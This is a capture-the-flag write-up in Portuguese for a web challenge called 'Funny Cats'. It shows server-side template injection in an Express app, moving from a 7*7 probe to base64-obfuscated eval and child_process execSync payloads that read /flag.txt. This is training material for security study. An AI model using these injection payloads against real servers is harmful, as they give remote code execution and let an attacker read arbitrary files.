# **WEB**

**Autor**: Hakal  
**Desafio**: Funny Cats  
**Nível**: Médio  

---

## **1. Introdução**

Neste write-up, abordaremos uma exploração que se aproveita da vulnerabilidade de Server-Side Template Injection (SSTI) em um servidor Express. O objetivo desta exploração é localizar a flag escondida no arquivo `/flag.txt` no servidor alvo. A exploração será realizada através de injeções de template, que permitem a execução de código arbitrário no servidor.

---

## **2. Análise do Código Vulnerável**

O site exibe imagens de gatos e permite a inserção de um nome de gato através de uma URL, como no exemplo: `https://funny-cats.chapeudepalhahacker.club/gato?name=Alfredo`. A vulnerabilidade SSTI ocorre quando a entrada do usuário é processada sem a devida sanitização, permitindo a execução de código no servidor.

---

## **3. Exploração da SSTI**

O objetivo da exploração é injetar código malicioso que nos permita ler o conteúdo do arquivo `/flag.txt`.

### **Passo 1: Demonstração de Injeção de Template Básica**

Para verificar a vulnerabilidade SSTI, injetamos um código simples que realiza uma multiplicação:

```
https://funny-cats.chapeudepalhahacker.club/gato?name=<%= 7*7 %>
```

**Saída:**

![Resultado da Injeção Básica](1.png)

### **Passo 2: Identificação do Sistema Operacional**

Para identificar o sistema operacional do servidor, utilizamos a função `eval` para decodificar um buffer em base64 que executa o comando `os.platform()`:

```
https://funny-cats.chapeudepalhahacker.club/gato?name=<%= '- Sistema Operacional: ' %><%=eval(Buffer('Z2xvYmFsLnByb2Nlc3MubWFpbk1vZHVsZS5yZXF1aXJlKCdvcycpLnBsYXRmb3JtKCk=', 'base64').toString())%><%= '' %>
```

**Saída:**

![Identificação do Sistema Operacional](2.png)

### **Passo 3: Leitura do Conteúdo de /flag.txt**

Para ler o conteúdo do arquivo `/flag.txt`, utilizamos a função `execSync` do módulo `child_process` para executar o comando `cat /flag.txt`:

```
https://funny-cats.chapeudepalhahacker.club/gato?name=<%= '- ' %><%= global.process.mainModule.require('child_process').execSync(Buffer('Y2F0IC9mbGFnLnR4dAo=', 'base64').toString()) %><%= '' %>
```

**Saída:**

![Leitura do Conteúdo de /flag.txt](3.png)

---

## **4. Conclusão**

Este desafio envolveu o processo de:

1. Identificação da vulnerabilidade de SSTI no servidor Express.
2. Injeção de código malicioso para identificar o sistema operacional do servidor.
3. Execução de comandos no servidor para ler o conteúdo do arquivo `/flag.txt` e obter a flag.

Com o conhecimento sobre a vulnerabilidade SSTI e a necessidade de URL encoding, foi possível realizar a exploração com sucesso e alcançar o objetivo final.

---
